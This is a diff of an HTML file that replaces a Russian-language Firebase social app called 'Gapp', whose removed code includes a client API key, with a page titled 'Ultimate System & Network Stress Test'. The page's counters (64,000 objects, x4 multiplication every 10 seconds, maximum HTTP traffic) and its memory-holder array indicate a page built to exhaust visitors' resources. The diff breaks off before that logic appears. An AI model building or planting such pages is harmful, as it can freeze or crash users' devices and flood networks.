@@ -3,1285 +3,217 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gapp — liquid glass + авторство + удаление</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>Ultimate System & Network Stress Test</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <style>
-        /* ===== СБРОС ===== */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background-color: var(--bg);
-            color: var(--text);
-            line-height: 1.5;
-            transition: background-color 0.3s, color 0.3s;
-            min-height: 100vh;
-            position: relative;
-            overflow-x: hidden;
-        }
-
-        /* ===== SVG ДЕКОР ===== */
-        .bg-svg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            pointer-events: none;
-        }
-        .bg-svg svg {
-            width: 100%;
-            height: 100%;
-            opacity: 0.3;
-        }
-        .liquid-blob {
-            animation: floatBlob 20s infinite alternate ease-in-out;
-        }
-        @keyframes floatBlob {
-            0% { transform: translate(0, 0) scale(1); }
-            100% { transform: translate(5%, 5%) scale(1.1); }
-        }
-
-        /* ===== ПЕРЕМЕННЫЕ ТЕМ ===== */
-        :root {
-            --bg: #f0f5fa;
-            --surface: rgba(255, 255, 255, 0.6);
-            --surface-solid: #ffffff;
-            --text: #1e293b;
-            --text-secondary: #64748b;
-            --primary: #4f46e5;
-            --primary-light: #818cf8;
-            --border: rgba(0, 0, 0, 0.1);
-            --shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
-            --glass: blur(12px);
-        }
-
-        body.dark {
-            --bg: #0f172a;
-            --surface: rgba(30, 41, 59, 0.7);
-            --surface-solid: #1e293b;
-            --text: #f1f5f9;
-            --text-secondary: #94a3b8;
-            --primary: #818cf8;
-            --primary-light: #a5b4fc;
-            --border: rgba(255, 255, 255, 0.1);
-            --shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-        }
-
-        /* ===== ГЛАВНЫЙ КОНТЕЙНЕР ===== */
-        .app {
-            max-width: 700px;
-            margin: 0 auto;
-            padding: 1rem;
-            padding-bottom: 5rem;
-            position: relative;
-            z-index: 2;
-        }
-
-        /* ===== ШАПКА ===== */
-        .header {
-            position: sticky;
-            top: 0;
-            z-index: 50;
-            background: var(--surface);
-            backdrop-filter: var(--glass);
-            -webkit-backdrop-filter: var(--glass);
-            border-bottom: 1px solid var(--border);
-            margin-bottom: 1.5rem;
-            border-radius: 0 0 2rem 2rem;
-            box-shadow: var(--shadow);
-            transition: background 0.3s;
-        }
-        .header-container {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            height: 70px;
-            padding: 0 1.5rem;
-        }
-        .logo {
-            font-size: 1.8rem;
-            font-weight: 800;
-            background: linear-gradient(135deg, var(--primary), var(--primary-light));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-        .logo:hover {
-            transform: scale(1.05);
-        }
-
-        /* Кнопка темы */
-        .theme-toggle {
-            background: var(--surface-solid);
-            border: 1px solid var(--border);
-            border-radius: 2rem;
-            width: 2.5rem;
-            height: 2.5rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            color: var(--text);
-            font-size: 1.2rem;
-            transition: all 0.3s;
-            box-shadow: var(--shadow);
-        }
-        .theme-toggle:hover {
-            transform: rotate(30deg);
-            background: var(--primary);
-            color: white;
-        }
-
-        /* Секция авторизации */
-        .auth-section {
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-        }
-        .auth-btn {
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 0.6rem 1.5rem;
-            border-radius: 2rem;
-            font-weight: 600;
-            cursor: pointer;
-            backdrop-filter: blur(4px);
-            transition: all 0.3s;
-            box-shadow: 0 4px 15px rgba(79, 70, 229, 0.4);
-        }
-        .auth-btn:hover {
-            background: var(--primary-light);
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(79, 70, 229, 0.5);
-        }
-        .user-info {
-            display: flex;
-            align-items: center;
-            gap: 0.8rem;
-        }
-        .user-avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            border: 2px solid var(--primary);
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-        .user-avatar:hover {
-            transform: scale(1.1);
-        }
-        .logout-btn {
-            background: transparent;
-            border: 1px solid var(--border);
-            color: var(--text-secondary);
-            padding: 0.3rem 1rem;
-            border-radius: 2rem;
-            font-size: 0.8rem;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .logout-btn:hover {
-            background: #ef4444;
-            color: white;
-            border-color: #ef4444;
-        }
-
-        /* ===== КАРТОЧКА СОЗДАНИЯ ПОСТА ===== */
-        .create-post-trigger {
-            background: var(--surface);
-            backdrop-filter: var(--glass);
-            -webkit-backdrop-filter: var(--glass);
-            border: 1px solid var(--border);
-            border-radius: 3rem;
-            padding: 0.8rem 1.5rem;
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            cursor: pointer;
-            margin-bottom: 2rem;
-            box-shadow: var(--shadow);
-            transition: all 0.3s;
-            animation: fadeInUp 0.5s;
-        }
-        .create-post-trigger:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 35px rgba(0,0,0,0.15);
-        }
-        .create-post-trigger .avatar {
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
-            background: var(--primary-light);
-        }
-        .create-post-trigger .placeholder {
-            flex: 1;
-            background: var(--surface-solid);
-            padding: 0.7rem 1.5rem;
-            border-radius: 3rem;
-            color: var(--text-secondary);
-            border: 1px solid var(--border);
-        }
-
-        /* ===== ПОСТЫ ===== */
-        .posts-container {
-            display: flex;
-            flex-direction: column;
-            gap: 1.8rem;
-        }
-        .post-card {
-            background: var(--surface);
-            backdrop-filter: var(--glass);
-            -webkit-backdrop-filter: var(--glass);
-            border: 1px solid var(--border);
-            border-radius: 2rem;
+            margin: 0;
             overflow: hidden;
-            box-shadow: var(--shadow);
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            animation: cardAppear 0.6s;
-            position: relative;
+            background-color: #000;
+            font-family: 'Segoe UI', sans-serif;
+            color: #00ff00;
         }
-        .post-card:hover {
-            transform: translateY(-8px) scale(1.02);
-            box-shadow: 0 25px 50px rgba(0,0,0,0.2);
-        }
-        /* Фоновый текст для приватных постов */
-        .post-card.private::before {
-            content: attr(data-author) "  " attr(data-author) "  " attr(data-author) "  ";
+
+        #ui-container {
             position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            font-size: 4rem;
-            font-weight: 800;
-            color: var(--text-secondary);
-            opacity: 0.1;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: clip;
-            line-height: 1.2;
-            pointer-events: none;
-            z-index: 0;
-            transform: rotate(-5deg) scale(1.2);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-transform: uppercase;
-        }
-
-        @keyframes cardAppear {
-            0% { opacity: 0; transform: translateY(30px); }
-            100% { opacity: 1; transform: translateY(0); }
-        }
-
-        .post-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 1rem 1.5rem;
-            position: relative;
-            z-index: 2;
-            background: inherit;
-        }
-        .post-author {
-            display: flex;
-            align-items: center;
-            gap: 0.8rem;
-            cursor: pointer;
-        }
-        .post-author img {
-            width: 42px;
-            height: 42px;
-            border-radius: 50%;
-            border: 2px solid var(--primary);
-        }
-        .post-author h4 {
-            font-weight: 700;
-            font-size: 0.95rem;
-        }
-        .post-date {
-            font-size: 0.7rem;
-            color: var(--text-secondary);
-            letter-spacing: 0.5px;
-        }
-        .private-badge {
-            color: var(--text-secondary);
-            font-size: 1rem;
-        }
-        .delete-btn {
-            background: transparent;
-            border: none;
-            color: var(--text-secondary);
-            font-size: 1.2rem;
-            cursor: pointer;
-            transition: color 0.2s, transform 0.2s;
-            margin-left: 0.5rem;
-        }
-        .delete-btn:hover {
-            color: #ef4444;
-            transform: scale(1.1);
-        }
-
-        .post-description {
-            padding: 0 1.5rem 0.8rem;
-            color: var(--text);
-            font-size: 0.95rem;
-            position: relative;
-            z-index: 2;
-            background: inherit;
-        }
-
-        .post-media {
-            width: 100%;
-            max-height: 500px;
-            object-fit: cover;
-            cursor: pointer;
-            background: black;
-            position: relative;
-            z-index: 2;
-        }
-        .video-container {
-            padding: 0.5rem;
-            position: relative;
-            z-index: 2;
-        }
-        .video-container iframe {
-            width: 100%;
-            aspect-ratio: 16/9;
-            border-radius: 1.5rem;
-            border: none;
-        }
-
-        .post-actions {
-            display: flex;
-            align-items: center;
-            gap: 2rem;
-            padding: 1rem 1.5rem;
-            border-top: 1px solid var(--border);
-            position: relative;
-            z-index: 2;
-            background: inherit;
-        }
-        .action-btn {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            background: transparent;
-            border: none;
-            color: var(--text-secondary);
-            font-weight: 600;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .action-btn i {
-            font-size: 1.4rem;
-            transition: transform 0.2s;
-        }
-        .action-btn:hover i {
-            transform: scale(1.2);
-        }
-        .action-btn.liked {
-            color: #f43f5e;
-        }
-        .share-btn {
-            margin-left: auto;
-            color: var(--text-secondary);
-            background: transparent;
-            border: none;
-            font-size: 1.2rem;
-            cursor: pointer;
-            transition: color 0.2s;
-        }
-        .share-btn:hover {
-            color: var(--primary);
-        }
-
-        /* ===== ПРОФИЛЬ ===== */
-        .profile-card {
-            background: var(--surface);
-            backdrop-filter: var(--glass);
-            border: 1px solid var(--border);
-            border-radius: 3rem;
-            padding: 2rem;
-            text-align: center;
-            margin-bottom: 2rem;
-            box-shadow: var(--shadow);
-        }
-        .profile-avatar {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            border: 4px solid var(--primary);
-            margin-bottom: 1rem;
-        }
-        .profile-name {
-            font-size: 1.8rem;
-            font-weight: 700;
-        }
-        .profile-email {
-            color: var(--text-secondary);
-            margin-bottom: 1rem;
-        }
-        .profile-stats {
-            display: flex;
-            justify-content: center;
-            gap: 2rem;
-            border-top: 1px solid var(--border);
-            padding-top: 1.5rem;
-        }
-        .stat {
-            font-weight: 700;
-            font-size: 1.2rem;
-        }
-        .stat-label {
-            font-size: 0.7rem;
-            color: var(--text-secondary);
-            text-transform: uppercase;
-        }
-        .license-info {
-            margin-top: 1.5rem;
-            padding-top: 1rem;
-            border-top: 1px dashed var(--border);
-            font-size: 0.8rem;
-            color: var(--text-secondary);
-        }
-        .license-info a {
-            color: var(--primary);
-            text-decoration: none;
-        }
-
-        /* ===== МОДАЛЬНЫЕ ОКНА ===== */
-        .modal-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.6);
-            backdrop-filter: blur(10px);
+            top: 20px;
+            left: 20px;
             z-index: 100;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 1rem;
-            animation: fadeIn 0.3s;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+            background: rgba(0, 0, 0, 0.95);
+            padding: 20px;
+            border: 2px solid #ff00ea;
+            pointer-events: none;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 30px rgba(255, 0, 234, 0.4);
         }
 
-        .modal-content {
-            background: var(--surface-solid);
-            border-radius: 2.5rem;
-            max-width: 600px;
-            width: 100%;
-            max-height: 90vh;
-            overflow: hidden;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.3);
-            animation: modalPop 0.4s;
-        }
-        .modal-content.large {
-            max-width: 1100px;
-        }
-        @keyframes modalPop {
-            0% { opacity: 0; transform: scale(0.8); }
-            100% { opacity: 1; transform: scale(1); }
+        .stat-line {
+            margin-bottom: 8px;
+            font-size: 16px;
+            text-shadow: 1px 1px 2px #000;
         }
 
-        .modal-header {
-            padding: 1.5rem;
-            border-bottom: 1px solid var(--border);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .modal-header h3 {
-            font-size: 1.5rem;
-            font-weight: 700;
-        }
-        .close-btn {
-            background: transparent;
-            border: none;
-            font-size: 2rem;
-            color: var(--text-secondary);
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-        .close-btn:hover {
-            transform: rotate(90deg);
-            color: var(--primary);
+        .stat-value {
+            font-weight: bold;
+            color: #fff;
+            font-family: monospace;
         }
 
-        .modal-body {
-            padding: 1.5rem;
-            overflow-y: auto;
-            max-height: calc(90vh - 80px);
-        }
-        /* Специально для просмотра поста */
-        .post-detail-layout {
-            display: flex;
-            flex-direction: column;
-            height: 100%;
-            max-height: calc(90vh - 80px);
-        }
-        .detail-media {
-            background: black;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-            max-height: 50vh;
-            overflow: auto;
-            padding: 0.5rem;
-        }
-        .detail-media img, .detail-media iframe {
-            max-width: 100%;
-            max-height: 100%;
-            object-fit: contain;
-        }
-        .detail-info {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-            padding: 1rem 1.5rem;
-        }
-        .comments-container {
-            flex: 1;
-            overflow-y: auto;
-            padding: 1rem 0;
-            display: flex;
-            flex-direction: column;
-            gap: 1rem;
-        }
-        .comment {
-            display: flex;
-            gap: 0.8rem;
-        }
-        .comment img {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-        }
-        .comment-input-area {
-            display: flex;
-            gap: 0.5rem;
-            align-items: center;
-            border-top: 1px solid var(--border);
-            padding-top: 1rem;
-            margin-top: 0.5rem;
-        }
-        .comment-input-area input {
-            flex: 1;
-            padding: 0.8rem 1rem;
-            border-radius: 3rem;
-            border: 1px solid var(--border);
-            background: var(--surface);
-            color: var(--text);
-        }
-        .emoji-btn {
-            background: transparent;
-            border: none;
-            font-size: 1.5rem;
-            cursor: pointer;
-            color: var(--text-secondary);
-            transition: transform 0.2s;
-        }
-        .emoji-btn:hover {
-            transform: scale(1.2);
-            color: var(--primary);
-        }
-        .emoji-picker {
-            display: flex;
-            gap: 0.5rem;
-            padding: 0.5rem;
-            background: var(--surface);
-            border-radius: 3rem;
-            margin-top: 0.5rem;
-            border: 1px solid var(--border);
-        }
-        .emoji-picker span {
-            font-size: 1.5rem;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-        .emoji-picker span:hover {
-            transform: scale(1.3);
+        #timer-msg {
+            color: #00eaff;
+            font-size: 14px;
+            margin-top: 10px;
+            text-transform: uppercase;
         }
 
-        /* Форма создания */
-        .type-toggle {
-            display: flex;
-            gap: 0.5rem;
-            margin: 1.5rem 0;
-        }
-        .type-btn {
-            flex: 1;
-            padding: 0.8rem;
-            border-radius: 2rem;
-            border: 1px solid var(--border);
-            background: var(--surface);
-            color: var(--text);
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .type-btn.active {
-            background: var(--primary);
-            color: white;
-            border-color: var(--primary);
-        }
-
-        .file-label {
+        #next-boom {
+            font-size: 28px;
+            color: #ff00ea;
             display: block;
-            border: 2px dashed var(--border);
-            border-radius: 1.5rem;
-            padding: 2rem;
-            text-align: center;
-            cursor: pointer;
-            transition: background 0.2s;
-            margin: 1rem 0;
-        }
-        .file-label:hover {
-            background: var(--surface);
-        }
-        .file-label input {
-            display: none;
-        }
-        .preview-box img {
-            max-height: 200px;
-            border-radius: 1rem;
-            margin-top: 1rem;
+            margin-top: 5px;
         }
 
-        textarea, input[type="text"] {
-            width: 100%;
-            padding: 1rem;
-            background: var(--surface);
-            border: 1px solid var(--border);
-            border-radius: 1.5rem;
-            color: var(--text);
-            font-size: 1rem;
-            resize: none;
-            outline: none;
-            transition: border 0.2s;
+        #network-status {
+            color: #ff3300;
+            font-size: 12px;
+            margin-top: 5px;
         }
-        textarea:focus, input:focus {
-            border-color: var(--primary);
-        }
-
-        .submit-btn {
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 0.8rem 2rem;
-            border-radius: 3rem;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 5px 20px rgba(79,70,229,0.5);
-        }
-        .submit-btn:hover:not(:disabled) {
-            background: var(--primary-light);
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(79,70,229,0.7);
-        }
-        .submit-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        /* Лоадер */
-        .loader {
-            border: 4px solid var(--surface);
-            border-top-color: var(--primary);
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 2rem auto;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* Тосты */
-        .toast {
-            position: fixed;
-            bottom: 2rem;
-            left: 50%;
-            transform: translateX(-50%);
-            background: var(--surface-solid);
-            color: var(--text);
-            padding: 0.8rem 2rem;
-            border-radius: 3rem;
-            box-shadow: var(--shadow);
-            z-index: 200;
-            animation: bounce 2s;
-        }
-
-        /* Утилиты */
-        .hidden { display: none !important; }
-        .text-center { text-align: center; }
-        .mt-4 { margin-top: 1rem; }
-        .mb-2 { margin-bottom: 0.5rem; }
-        .flex { display: flex; }
-        .items-center { align-items: center; }
-        .gap-2 { gap: 0.5rem; }
-        .gap-4 { gap: 1rem; }
-        .w-full { width: 100%; }
     </style>
 </head>
 <body>
-    <!-- Фоновый SVG -->
-    <div class="bg-svg">
-        <svg viewBox="0 0 1200 800" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">
-            <defs>
-                <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
-                    <stop offset="0%" stop-color="var(--primary)" stop-opacity="0.2" />
-                    <stop offset="100%" stop-color="var(--primary-light)" stop-opacity="0.2" />
-                </linearGradient>
-                <filter id="glow">
-                    <feGaussianBlur stdDeviation="10" result="coloredBlur"/>
-                    <feMerge>
-                        <feMergeNode in="coloredBlur"/>
-                        <feMergeNode in="SourceGraphic"/>
-                    </feMerge>
-                </filter>
-            </defs>
-            <circle cx="200" cy="200" r="150" fill="url(#grad1)" filter="url(#glow)" class="liquid-blob">
-                <animate attributeName="cx" values="200;250;200" dur="20s" repeatCount="indefinite" />
-                <animate attributeName="cy" values="200;150;200" dur="18s" repeatCount="indefinite" />
-            </circle>
-            <circle cx="900" cy="500" r="200" fill="url(#grad1)" filter="url(#glow)" class="liquid-blob">
-                <animate attributeName="cx" values="900;850;900" dur="22s" repeatCount="indefinite" />
-                <animate attributeName="cy" values="500;550;500" dur="19s" repeatCount="indefinite" />
-            </circle>
-            <circle cx="400" cy="600" r="120" fill="url(#grad1)" filter="url(#glow)" class="liquid-blob">
-                <animate attributeName="r" values="120;140;120" dur="15s" repeatCount="indefinite" />
-            </circle>
-        </svg>
+
+    <div id="ui-container">
+        <div class="stat-line">FPS: <span id="fps-counter" class="stat-value">--</span></div>
+        <div class="stat-line">3D Объекты: <span id="obj-count" class="stat-value">64,000</span></div>
+        <div class="stat-line">Сетевой трафик: <span id="net-load" class="stat-value">MAX</span></div>
+        <div id="network-status">HTTP Requests: ACTIVE</div>
+        <div id="timer-msg">УМНОЖЕНИЕ x4 ЧЕРЕЗ: <span id="next-boom">10</span></div>
     </div>
 
-    <!-- Шапка -->
-    <header class="header">
-        <div class="header-container">
-            <h1 class="logo" onclick="showView('feed')">Gapp</h1>
-            <div class="auth-section" id="auth-section"></div>
-            <button class="theme-toggle" id="themeToggle" aria-label="Переключить тему">
-                <i class="fas fa-moon"></i>
-            </button>
-        </div>
-    </header>
+    <script>
+        let scene, camera, renderer;
+        let objects = [];
+        let memoryHolders = [];
+        let lastTime = performance.now();
+        let frames = 0;
+        let secondsToNextBoom = 10;
 
-    <main class="app">
-        <!-- Вкладка Лента -->
-        <section id="view-feed" class="space-y-6">
-            <div id="create-post-trigger" class="create-post-trigger hidden">
-                <img id="current-user-avatar" class="avatar" src="" alt="">
-                <div class="placeholder">Что нового?</div>
-            </div>
-            <div id="posts-container" class="posts-container">
-                <div class="text-center py-20" style="color: var(--text-secondary);">Загрузка постов...</div>
-                <div class="loader"></div>
-            </div>
-        </section>
+        const textureLoader = new THREE.TextureLoader();
+        const texPaths = ['fone.gif', 'exp.gif'];
 
-        <!-- Вкладка Профиль -->
-        <section id="view-profile" class="hidden space-y-6">
-            <div class="profile-card">
-                <img id="profile-avatar" class="profile-avatar" src="" alt="">
-                <h2 id="profile-name" class="profile-name"></h2>
-                <p id="profile-email" class="profile-email"></p>
-                <div class="profile-stats">
-                    <div>
-                        <div id="profile-posts-count" class="stat">0</div>
-                        <div class="stat-label">Посты</div>
-                    </div>
-                </div>
-                <!-- Информация об авторстве и лицензии MIT -->
-                <div class="license-info">
-                    © 2025 <strong>piaediruss / p1rs23</strong> — лицензия MIT.<br>
-                    Исходный код доступен на <a href="#" onclick="alert('Репозиторий: https://github.com/piaediruss/gapp'); return false;">GitHub</a>.
-                </div>
-            </div>
-            <div id="profile-posts" class="posts-container"></div>
-        </section>
-    </main>
+        const objDisplay = document.getElementById('obj-count');
+        const fpsDisplay = document.getElementById('fps-counter');
+        const timerDisplay = document.getElementById('next-boom');
 
-    <!-- Модалка создания поста -->
-    <div id="modal-create" class="modal-overlay hidden">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>Создать публикацию</h3>
-                <button onclick="closeModal()" class="close-btn">&times;</button>
-            </div>
-            <div class="modal-body">
-                <!-- Поле описания + эмодзи -->
-                <div style="margin-bottom: 1rem;">
-                    <textarea id="post-desc" placeholder="Описание..." rows="4"></textarea>
-                    <div class="emoji-picker" id="post-emoji-picker" style="justify-content: flex-end; margin-top: 0.5rem;">
-                        <span onclick="insertEmoji('post-desc', '😊')">😊</span>
-                        <span onclick="insertEmoji('post-desc', '😂')">😂</span>
-                        <span onclick="insertEmoji('post-desc', '❤️')">❤️</span>
-                        <span onclick="insertEmoji('post-desc', '👍')">👍</span>
-                        <span onclick="insertEmoji('post-desc', '🔥')">🔥</span>
-                    </div>
-                </div>
-
-                <div class="type-toggle">
-                    <button onclick="setPostType('image')" id="type-btn-image" class="type-btn active">Фото</button>
-                    <button onclick="setPostType('video')" id="type-btn-video" class="type-btn">Видео</button>
-                </div>
-
-                <div id="input-image-container">
-                    <label class="file-label">
-                        <input type="file" id="post-file" accept="image/*" onchange="previewImage(this)">
-                        <div id="preview-box">
-                            <i class="fas fa-cloud-upload-alt" style="font-size: 2rem; color: var(--primary);"></i>
-                            <p>Выберите изображение</p>
-                        </div>
-                    </label>
-                </div>
-
-                <div id="input-video-container" class="hidden">
-                    <input type="text" id="post-video-url" placeholder="Ссылка на YouTube или MP4">
-                </div>
-
-                <div class="flex items-center justify-between mt-4">
-                    <label class="flex items-center gap-2">
-                        <input type="checkbox" id="post-private" class="w-4 h-4">
-                        <span style="color: var(--text-secondary);">Только по ссылке</span>
-                    </label>
-                    <button id="submit-post" class="submit-btn">Опубликовать</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Модалка просмотра поста -->
-    <div id="modal-post-view" class="modal-overlay hidden">
-        <div class="modal-content large" style="max-width: 1100px;">
-            <div class="modal-header">
-                <h3>Публикация</h3>
-                <button onclick="closePostView()" class="close-btn">&times;</button>
-            </div>
-            <div id="post-view-content" class="modal-body" style="padding: 0;">
-                <!-- динамика -->
-            </div>
-        </div>
-    </div>
-
-    <!-- Firebase модули и логика -->
-    <script type="module">
-        // =========================================================================
-        // MIT License
-        // Copyright (c) 2025 piaediruss / p1rs23
-        //
-        // Permission is hereby granted, free of charge, to any person obtaining a copy
-        // of this software and associated documentation files (the "Software"), to deal
-        // in the Software without restriction, including without limitation the rights
-        // to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-        // copies of the Software, and to permit persons to whom the Software is
-        // furnished to do so, subject to the following conditions:
-        //
-        // The above copyright notice and this permission notice shall be included in all
-        // copies or substantial portions of the Software.
-        //
-        // THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-        // IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-        // FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-        // AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-        // LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-        // OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-        // SOFTWARE.
-        // =========================================================================
-
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getAuth, GoogleAuthProvider, signInWithPopup, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-        import { getFirestore, collection, addDoc, query, onSnapshot, doc, updateDoc, getDoc, arrayUnion, arrayRemove, orderBy, deleteDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
-
-        // Конфиг Firebase
-        const firebaseConfig = {
-            apiKey: "AIzaSyDb_xlpLYoVEkd1aObJjzvlS8-JPDjn72E",
-            authDomain: "generalapp-b4f45.firebaseapp.com",
-            databaseURL: "https://generalapp-b4f45-default-rtdb.firebaseio.com",
-            projectId: "generalapp-b4f45",
-            storageBucket: "generalapp-b4f45.firebasestorage.app",
-            messagingSenderId: "800461808673",
-            appId: "1:800461808673:web:ec6374f28c7a40ced7ef60",
-            measurementId: "G-JYL0G1J1GJ"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const auth = getAuth(app);
-        const db = getFirestore(app);
-        const provider = new GoogleAuthProvider();
-        const appId = 'gapp-v1';
-
-        // Состояние
-        let currentUser = null;
-        let postType = 'image';
-        let currentView = 'feed';
-        let posts = [];
-
-        // Переключение темы
-        const themeToggle = document.getElementById('themeToggle');
-        const savedTheme = localStorage.getItem('theme') || 'light';
-        if (savedTheme === 'dark') {
-            document.body.classList.add('dark');
-            themeToggle.innerHTML = '<i class="fas fa-sun"></i>';
-        } else {
-            themeToggle.innerHTML = '<i class="fas fa-moon"></i>';
-        }
-        themeToggle.addEventListener('click', () => {
-            document.body.classList.toggle('dark');
-            const isDark = document.body.classList.contains('dark');
-            localStorage.setItem('theme', isDark ? 'dark' : 'light');
-            themeToggle.innerHTML = isDark ? '<i class="fas fa-sun"></i>' : '<i class="fas fa-moon"></i>';
-        });
-
-        // Глобальные функции
-        window.showView = (view, uid = null) => {
-            currentView = view;
-            document.querySelectorAll('section').forEach(s => s.classList.add('hidden'));
-            document.getElementById(`view-${view}`).classList.remove('hidden');
-            if(view === 'profile' && uid) loadProfile(uid);
-            if(view === 'feed') renderPosts(posts, false); // лента без приватных
-            window.scrollTo(0, 0);
-        };
-
-        window.closeModal = () => document.getElementById('modal-create').classList.add('hidden');
-        window.setPostType = (type) => {
-            postType = type;
-            document.getElementById('input-image-container').classList.toggle('hidden', type !== 'image');
-            document.getElementById('input-video-container').classList.toggle('hidden', type !== 'video');
-            document.getElementById('type-btn-image').classList.toggle('active', type === 'image');
-            document.getElementById('type-btn-video').classList.toggle('active', type === 'video');
-        };
-
-        window.previewImage = (input) => {
-            const file = input.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = (e) => {
-                    document.getElementById('preview-box').innerHTML = `<img src="${e.target.result}" class="preview-box img">`;
-                };
-                reader.readAsDataURL(file);
-            }
-        };
-
-        // Вставка эмодзи
-        window.insertEmoji = (fieldId, emoji) => {
-            const field = document.getElementById(fieldId);
-            if (!field) return;
-            const start = field.selectionStart;
-            const end = field.selectionEnd;
-            field.value = field.value.substring(0, start) + emoji + field.value.substring(end);
-            field.selectionStart = field.selectionEnd = start + emoji.length;
-            field.focus();
-        };
-
-        // Авторизация
-        document.addEventListener('click', (e) => {
-            if (e.target.id === 'login-btn' || e.target.id === 'login-btn-new') {
-                signInWithPopup(auth, provider);
-            }
-        });
-
-        onAuthStateChanged(auth, (user) => {
-            currentUser = user;
-            const authSection = document.getElementById('auth-section');
-            if (user) {
-                authSection.innerHTML = `
-                    <div class="user-info">
-                        <img onclick="showView('profile', '${user.uid}')" src="${user.photoURL}" class="user-avatar">
-                        <button id="logout-btn" class="logout-btn">Выход</button>
-                    </div>
-                `;
-                document.getElementById('logout-btn').onclick = () => signOut(auth);
-                document.getElementById('create-post-trigger').classList.remove('hidden');
-                document.getElementById('current-user-avatar').src = user.photoURL;
-                document.getElementById('create-post-trigger').onclick = () => document.getElementById('modal-create').classList.remove('hidden');
-            } else {
-                authSection.innerHTML = `<button id="login-btn-new" class="auth-btn">Войти через Google</button>`;
-                document.getElementById('create-post-trigger').classList.add('hidden');
-                // при выходе перерендерить ленту без приватных
-                if (currentView === 'feed') renderPosts(posts, false);
-            }
-        });
-
-        // Firestore
-        const postsRef = collection(db, 'artifacts', appId, 'public', 'data', 'posts');
-        const postsQuery = query(postsRef, orderBy('createdAt', 'desc'));
-
-        onSnapshot(postsQuery, (snapshot) => {
-            posts = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
-            if (currentView === 'feed') {
-                renderPosts(posts, false);
-            } else if (currentView === 'profile' && currentUser) {
-                loadProfile(currentUser.uid);
-            }
-        });
-
-        // Загрузка поста
-        window.uploadPost = async function() {
-            if (!currentUser) return;
-            const desc = document.getElementById('post-desc').value;
-            const isPrivate = document.getElementById('post-private').checked;
-            const btn = document.getElementById('submit-post');
-            btn.disabled = true;
-            btn.innerText = 'Загрузка...';
